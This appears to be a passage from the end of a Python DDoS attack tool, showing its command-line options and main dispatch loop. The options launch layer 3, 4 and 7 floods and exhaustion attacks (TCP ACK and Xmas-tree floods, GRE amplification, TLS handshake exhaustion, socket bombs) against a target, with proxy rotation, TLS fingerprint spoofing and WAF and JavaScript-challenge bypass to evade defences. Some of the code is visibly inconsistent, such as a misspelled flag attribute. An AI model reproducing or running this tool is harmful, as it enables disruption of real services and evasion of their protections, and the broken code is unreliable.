    parser.add_argument("--ai-header-bypass", action="store_true", help="Enable AI-Bypass Header Synthesis")
    parser.add_argument("--tls-fingerprint-rotate", action="store_true", help="Enable Real-Time Fingerprint Spoofer (TLS + JA3)")
    parser.add_argument("--proxy-auto-score", action="store_true", help="Enable Proxy Score Autobalancer")
    parser.add_argument("--simulate-waf-react", action="store_true", help="Enable WAF Reaction Simulator")
    parser.add_argument("--log-success", action="store_true", help="Log successful payloads")
    parser.add_argument("--replay-mode", action="store_true", help="Replay logged successful payloads")
    parser.add_argument("--timed-chain", action="store_true", help="Enable Time-based Chainer")
    parser.add_argument("--l7l4-blend", action="store_true", help="Enable Extra Brutality: Partial L4 Blend")
    parser.add_argument("--raw-packet-flood", action="store_true", help="Enable Raw Packet Flood (L3)")
    parser.add_argument("--ip-fragmentation-exploit", action="store_true", help="Enable IP Fragmentation Exploit (L3)")
    parser.add_argument("--icmp-fragment-flood", action="store_true", help="Enable ICMP Fragment Flood (L3)")
    parser.add_argument("--gre-amplification", action="store_true", help="Enable GRE Amplification (L3)")
    parser.add_argument("--tcp-ack-flood", action="store_true", help="Enable TCP ACK Flood (L4)")
    parser.add_argument("--tcp-xmas-tree-flood", action="store_true", help="Enable TCP Xmas Tree Flood (L4)")
    parser.add_argument("--udp-protocol-exhaustion", action="store_true", help="Enable UDP Protocol Exhaustion (L4)")
    parser.add_argument("--tls-handshake-exhaustion", action="store_true", help="Enable TLS Handshake Exhaustion (L4)")
    parser.add_argument("--dynamic-payload-mutation", action="store_true", help="Enable Dynamic Payload Mutation (L7)")
    parser.add_argument("--header-overflow-exploit", action="store_true", help="Enable Header Overflow Exploit (L7)")
    parser.add_argument("--cookie-logic-bombing", action="store_true", help="Enable Cookie Logic Bombing (L7)")
    parser.add_argument("--bypass-javascript-challenge", action="store_true", help="Enable Bypass JavaScript Challenge (L7)")
    parser.add_argument("--recursive-path-ref-exploit", action="store_true", help="Enable Recursive Path & Ref Exploit (L7)")
    parser.add_argument("--intelligent-async-socket-bomb", action="store_true", help="Enable Intelligent Async Socket Bomb (L7)")
    args = parser.parse_args()

    target = args.target
    threads = args.threads
    proxies = load_proxies(args.proxies)
    use_tls = args.tls

    if proxies:
        valid_proxies = [proxy for proxy in proxies if asyncio.run(validate_proxy(proxy))]
        if not valid_proxies:
            print(Fore.RED + "[!] No valid proxies found.")
            return
        proxies = valid_proxies

    asyncio.run(detect_waf(aiohttp.ClientSession(), target))

    attack_end = time.time() + 60  # Default duration of 60 seconds

    tasks = []

    if args.smart_mutate:
        tasks.append(smart_flood_mutation(target, proxies, threads, use_tls))
    if args.exploit_chain_mode:
        tasks.append(exploit_chaining_mode(target, proxies, threads, use_tls))
    if args.ghost_mutate_deep:
        tasks.append(adaptive_ghost_mutation(target, proxies, threads, use_tls))
    if args.ai_header_bypass:
        tasks.append(ai_bypass_header_synthesis(target, proxies, threads, use_tls))
    if args.tls_fingerprint_rotate:
        tasks.append(tls_fingerprint_rotate(target, proxies, threads, use_tls))
    if args.proxy_auto_score:
        tasks.append(proxy_score_autobalancer(target, proxies, threads, use_tls))
    if args.simulate_waf_reac:
        tasks.append(waf_reaction_simulator(target, proxies, threads, use_tls))
    if args.log_success or args.replay_mode:
        tasks.append(attack_log_replay(target, proxies, threads, use_tls, args.replay_mode))
    if args.timed_chain:
        tasks.append(timed_chainer(target, proxies, threads, use_tls))
    if args.l7l4_blend:
        tasks.append(l7l4_blend(target, proxies, threads, use_tls))
    if args.raw_packet_flood:
        tasks.append(raw_packet_flood(target, threads))
    if args.ip_fragmentation_exploit:
        tasks.append(ip_fragmentation_exploit(target, threads))
    if args.icmp_fragment_flood:
        tasks.append(icmp_fragment_flood(target, threads))
    if args.gre_amplification:
        tasks.append(gre_amplification(target, threads))
    if args.tcp_ack_flood:
        tasks.append(tcp_ack_flood(target, threads))
    if args.tcp_xmas_tree_flood:
        tasks.append(tcp_xmas_tree_flood(target, threads))
    if args.udp_protocol_exhaustion:
        tasks.append(udp_protocol_exhaustion(target, threads))
    if args.tls_handshake_exhaustion:
        tasks.append(tls_handshake_exhaustion(target, threads))
    if args.dynamic_payload_mutation:
        tasks.append(dynamic_payload_mutation(target, proxies, threads, use_tls))
    if args.header_overflow_exploit:
        tasks.append(header_overflow_exploit(target, proxies, threads, use_tls))
    if args.cookie_logic_bombing:
        tasks.append(cookie_logic_bombing(target, proxies, threads, use_tls))
    if args.bypass_javascript_challenge:
        tasks.append(bypass_javascript_challenge(target, proxies, threads, use_tls))
    if args.recursive_path_ref_exploit:
        tasks.append(recursive_path_ref_exploit(target, proxies, threads, use_tls))
    if args.intelligent_async_socket_bomb:
        tasks.append(intelligent_async_socket_bomb(target, proxies, threads, use_tls))

    attack_start = time.time()
    await asyncio.gather(
        *tasks,
        real_time_status_tracker(threads, attack_start, attack_end)
    )

if __name__ == "__main__":
    asyncio.run(main())